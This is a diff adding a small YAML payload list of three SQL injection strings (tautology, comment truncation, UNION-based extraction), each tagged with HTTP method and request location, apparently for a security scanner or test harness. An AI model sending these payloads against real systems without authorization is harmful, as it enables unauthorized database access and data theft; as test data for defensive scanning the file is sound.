@@ -1,0 +1,17 @@
+category: "SQL Injection"
+vectors:
+  - id: "sqli-001"
+    payload: "' OR '1'='1"
+    description: "Basic Tautology"
+    method: "GET"
+    location: "query" # query, body, header/User-Agent
+  - id: "sqli-002"
+    payload: "admin' --"
+    description: "Comment truncation"
+    method: "POST"
+    location: "body"
+  - id: "sqli-003"
+    payload: "UNION SELECT 1,2,3,4--"
+    description: "Union based extraction"
+    method: "GET"
+    location: "query"
